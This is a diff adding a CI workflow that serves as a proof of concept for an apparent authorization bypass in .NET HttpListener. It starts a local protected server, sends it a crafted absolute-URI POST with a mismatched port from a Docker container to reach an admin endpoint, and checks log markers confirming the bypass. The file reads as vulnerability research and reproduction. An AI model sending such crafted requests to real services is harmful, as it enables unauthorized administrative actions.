@@ -1,0 +1,50 @@
+name: HttpListener remote port-only bypass proof
+on:
+  push:
+    branches: [research/httplistener-remote-port-bypass-20260920]
+permissions:
+  contents: read
+jobs:
+  remote-proof:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-dotnet@v4
+        with: { dotnet-version: '10.0.x' }
+      - name: Start protected HttpListener server
+        working-directory: research/httplistener-remote-port-bypass
+        shell: bash
+        run: |
+          set -euxo pipefail
+          rm -f /tmp/httplistener-remote-ready /tmp/httplistener-remote-admin-marker /tmp/remote-server.log
+          dotnet run -c Release > /tmp/remote-server.log 2>&1 &
+          echo $! > /tmp/remote-server.pid
+          for i in $(seq 1 60); do
+            test -f /tmp/httplistener-remote-ready && exit 0
+            sleep 0.5
+          done
+          cat /tmp/remote-server.log
+          exit 1
+
+      - name: Send attack from separate Docker network namespace
+        shell: bash
+        run: |
+          set -euxo pipefail
+          docker run --rm --add-host=host.docker.internal:host-gateway python:3.13-alpine             python -c 'import socket; s=socket.create_connection(("host.docker.internal",46181),5); req=b"POST http://service.test:46182/admin-action HTTP/1.1\r\nHost: service.test:46182\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"; s.sendall(req); data=b""; while True:
+    b=s.recv(4096)
+    if not b: break
+    data+=b
+print(data.decode("latin1")); assert b"200" in data and b"REMOTE_ADMIN_ACTION_EXECUTED=true" in data'
+
+      - name: Assert remote protected state change
+        shell: bash
+        run: |
+          set -euxo pipefail
+          pid=$(cat /tmp/remote-server.pid)
+          wait "$pid" || { cat /tmp/remote-server.log; exit 1; }
+          cat /tmp/remote-server.log
+          grep -F 'REMOTE_PORT_ONLY_AUTH_BYPASS=CONFIRMED REMOTE_NON_LOOPBACK=True' /tmp/remote-server.log
+          grep -F 'WIRE_HOST_EQUALS_TARGET_AUTHORITY=True' /tmp/remote-server.log
+          grep -F 'MARKER_EXISTS=True' /tmp/remote-server.log
+          grep -F 'REMOTE_PORT_ONLY_PROOF=PASS' /tmp/remote-server.log
